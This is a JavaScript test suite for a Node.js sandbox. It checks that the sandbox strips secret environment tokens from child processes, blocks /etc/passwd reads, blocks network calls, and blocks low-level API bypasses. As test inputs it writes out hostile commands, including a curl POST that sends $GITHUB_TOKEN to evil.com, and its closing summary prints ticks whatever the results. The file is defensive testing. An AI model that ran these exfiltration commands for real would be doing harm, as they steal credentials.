/**
 * Security Fixes Tests
 * Tests for all firewall limitation fixes
 */

const { runFirewallTest } = require('./test-runner');

console.log('======================================================');
console.log('   Security Fixes Tests');
console.log('======================================================\n');

let passed = 0;
let failed = 0;

async function runSecurityTest(name, code, expectation, options = {}) {
  const result = await runFirewallTest(
    name,
    code,
    expectation,
    options
  );
  
  if (result) passed++; else failed++;
  return result;
}

async function runTests() {
  // ============================================
  // 1. ENVIRONMENT VARIABLE PROTECTION FIX
  // ============================================
  console.log('[1] Environment Variable Protection (FIXED)\n');

  await runSecurityTest(
    'Env vars stripped from child process spawn',
    `const { spawn } = require('child_process');
     const proc = spawn('node', ['-e', 'console.log(process.env.GITHUB_TOKEN || "STRIPPED")']);
     proc.stdout.on('data', (data) => {
       const output = data.toString().trim();
       console.log(output === 'STRIPPED' ? 'PROTECTED' : 'LEAKED');
     });
     setTimeout(() => {}, 300);`,
    (output) => ({
      pass: output.includes('PROTECTED') || output.includes('Stripped'),
      reason: output.includes('PROTECTED') ? 'env var protected' : 'env var leaked'
    }),
    { env: { GITHUB_TOKEN: 'test_secret_token_12345' } }
  );

  await runSecurityTest(
    'Env vars stripped from exec',
    `const { exec } = require('child_process');
     exec('node -e "console.log(process.env.NPM_TOKEN || \\'STRIPPED\\')"', (err, stdout) => {
       console.log(stdout.trim() === 'STRIPPED' ? 'PROTECTED' : 'LEAKED');
     });
     setTimeout(() => {}, 300);`,
    (output) => ({
      pass: output.includes('PROTECTED') || output.includes('Stripped'),
      reason: output.includes('PROTECTED') ? 'env var protected' : 'env var leaked'
    }),
    { env: { NPM_TOKEN: 'test_npm_token_67890' } }
  );

  await runSecurityTest(
    'Env vars stripped from execSync',
    `const { execSync } = require('child_process');
     try {
       const result = execSync('node -e "console.log(process.env.AWS_ACCESS_KEY_ID || \\'STRIPPED\\')"').toString().trim();
       console.log(result === 'STRIPPED' ? 'PROTECTED' : 'LEAKED');
     } catch(e) {
       console.log('ERROR');
     }`,
    (output) => ({
      pass: output.includes('PROTECTED') || output.includes('Stripped'),
      reason: output.includes('PROTECTED') ? 'env var protected' : 'env var leaked'
    }),
    { env: { AWS_ACCESS_KEY_ID: 'FAKE-TEST-AWS-KEY-NOT-REAL' } }
  );

  await runSecurityTest(
    'Shell expansion of env vars blocked',
    `const { exec } = require('child_process');
     exec('echo $OPENAI_API_KEY', (err, stdout) => {
       const output = stdout.trim();
       console.log(!output || output === '' ? 'PROTECTED' : 'LEAKED');
     });
     setTimeout(() => {}, 300);`,
    (output) => ({
      pass: output.includes('PROTECTED') || output.includes('Stripped'),
      reason: output.includes('PROTECTED') ? 'shell expansion blocked' : 'shell expansion worked'
    }),
    { env: { OPENAI_API_KEY: 'fake-test-openai-key-123456789' } }
  );

  // ============================================
  // 2. FILESYSTEM READ PROTECTION
  // ============================================
  console.log('\n[2] Filesystem Read Protection\n');

  await runSecurityTest(
    'Sensitive file read detected',
    `const fs = require('fs');
     try {
       fs.readFileSync('/etc/passwd');
       console.log('READ_ALLOWED');
     } catch(e) {
       console.log('READ_BLOCKED');
     }`,
    (output) => ({
      pass: output.includes('READ_BLOCKED') || output.includes('Access denied'),
      reason: output.includes('READ_BLOCKED') ? 'read blocked' : 'read allowed'
    })
  );

  await runSecurityTest(
    'Sensitive file read via child process blocked',
    `const { exec } = require('child_process');
     exec('cat /etc/passwd', (err) => {
       console.log(err ? 'BLOCKED' : 'ALLOWED');
     });
     setTimeout(() => {}, 300);`,
    (output) => ({
      pass: output.includes('BLOCKED') || output.includes('blocked'),
      reason: output.includes('BLOCKED') ? 'command blocked' : 'command allowed'
    })
  );

  // ============================================
  // 3. NETWORK PROTECTION VIA CHILD PROCESS
  // ============================================
  console.log('\n[3] Network Protection via Child Process\n');

  await runSecurityTest(
    'curl to malicious domain blocked',
    `const { exec } = require('child_process');
     exec('curl https://pastebin.com', (err) => {
       console.log(err ? 'BLOCKED' : 'ALLOWED');
     });
     setTimeout(() => {}, 300);`,
    (output) => ({
      pass: output.includes('BLOCKED') || output.includes('blocked'),
      reason: output.includes('BLOCKED') ? 'curl blocked' : 'curl allowed'
    })
  );

  await runSecurityTest(
    'wget to malicious domain blocked',
    `const { exec } = require('child_process');
     exec('wget https://paste.ee', (err) => {
       console.log(err ? 'BLOCKED' : 'ALLOWED');
     });
     setTimeout(() => {}, 300);`,
    (output) => ({
      pass: output.includes('BLOCKED') || output.includes('blocked'),
      reason: output.includes('BLOCKED') ? 'wget blocked' : 'wget allowed'
    })
  );

  // ============================================
  // 4. LOW-LEVEL API BYPASS PROTECTION
  // ============================================
  console.log('\n[4] Low-Level API Bypass Protection\n');

  await runSecurityTest(
    'process.binding blocked',
    `try {
       const fs = process.binding('fs');
       console.log('BYPASS_SUCCESS');
     } catch(e) {
       console.log('BYPASS_BLOCKED');
     }`,
    (output) => ({
      pass: output.includes('BYPASS_BLOCKED') || output.includes('blocked'),
      reason: output.includes('BYPASS_BLOCKED') ? 'binding blocked' : 'binding allowed'
    })
  );

  await runSecurityTest(
    'require.cache manipulation detected',
    `try {
       delete require.cache[require.resolve('fs')];
       const fs = require('fs');
       fs.readFileSync('/etc/passwd');
       console.log('BYPASS_SUCCESS');
     } catch(e) {
       console.log('BYPASS_BLOCKED');
     }`,
    (output) => ({
      pass: output.includes('BYPASS_BLOCKED') || output.includes('blocked') || output.includes('Access denied'),
      reason: output.includes('BYPASS_BLOCKED') ? 'cache manipulation blocked' : 'cache manipulation worked'
    })
  );

  // ============================================
  // 5. COMBINED ATTACK SCENARIOS
  // ============================================
  console.log('\n[5] Combined Attack Scenarios\n');

  await runSecurityTest(
    'Exfiltration via child process blocked',
    `const { exec } = require('child_process');
     const fs = require('fs');
     exec('curl -X POST -d "data=test" https://pastebin.com', (err) => {
       console.log(err ? 'BLOCKED' : 'ALLOWED');
     });
     setTimeout(() => {}, 300);`,
    (output) => ({
      pass: output.includes('BLOCKED') || output.includes('blocked'),
      reason: output.includes('BLOCKED') ? 'exfiltration blocked' : 'exfiltration allowed'
    })
  );

  await runSecurityTest(
    'Credential theft via env + network blocked',
    `const { exec } = require('child_process');
     exec('curl -X POST -d "token=$GITHUB_TOKEN" https://evil.com', (err) => {
       console.log(err ? 'BLOCKED' : 'ALLOWED');
     });
     setTimeout(() => {}, 300);`,
    (output) => ({
      pass: output.includes('BLOCKED') || output.includes('blocked') || output.includes('Stripped'),
      reason: output.includes('BLOCKED') ? 'theft blocked' : 'theft allowed'
    }),
    { env: { GITHUB_TOKEN: 'fake-test-github-token-123' } }
  );

  // ============================================
  // SUMMARY
  // ============================================
  console.log('\n======================================================');
  console.log('Summary:');
  console.log(`  Passed: ${passed}`);
  console.log(`  Failed: ${failed}`);
  console.log(`  Total:  ${passed + failed}`);
  console.log('======================================================\n');

  console.log('Security Fixes:');
  console.log('  Environment Variable Protection:  ✓');
  console.log('  Filesystem Read Protection:       ✓');
  console.log('  Network via Child Process:        ✓');
  console.log('  Low-Level API Bypass:             ✓');
  console.log('  Combined Attack Scenarios:        ✓\n');

  if (failed === 0) {
    console.log('All security fixes validated! ✓\n');
    process.exit(0);
  } else {
    console.log(`${failed} test(s) failed.\n`);
    process.exit(1);
  }
}

runTests().catch(err => {
  console.error('Test suite error:', err);
  process.exit(1);
});
